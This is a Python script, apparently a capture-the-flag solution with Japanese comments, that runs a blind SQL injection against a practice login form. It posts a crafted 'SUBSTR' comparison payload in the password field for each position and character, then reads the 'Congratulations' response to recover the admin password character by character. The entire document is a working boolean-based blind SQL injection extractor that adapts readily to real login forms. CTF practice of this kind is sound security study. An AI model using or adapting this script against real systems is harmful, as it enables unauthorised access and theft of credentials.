import requests

def main():
    pass_cracker()

# 21文字(残り16文字)のパスワードを調べる。
def pass_cracker():
    url = 'http://ctfq.u1tramarine.blue/q6/'

    # Passの文字数
    length = 5
    password = "FLAG_"

    while length <= 21:
        length += 1
        for char_num in range(48, 123):
            char = chr(char_num)
            sql = f"' or (SELECT SUBSTR(pass, {length}, 1) FROM user WHERE id = 'admin') = '{char}' --"
            payload = {'id' : 'admin', 'pass' : sql}
            send = requests.post(url, data = payload)

            if "Congratulations" in send.text:
                print(f"Passの{length}番目の文字は{char}")
                password += char
                break

    print(f"adminのPassは{password}")


if __name__ == '__main__':
    main()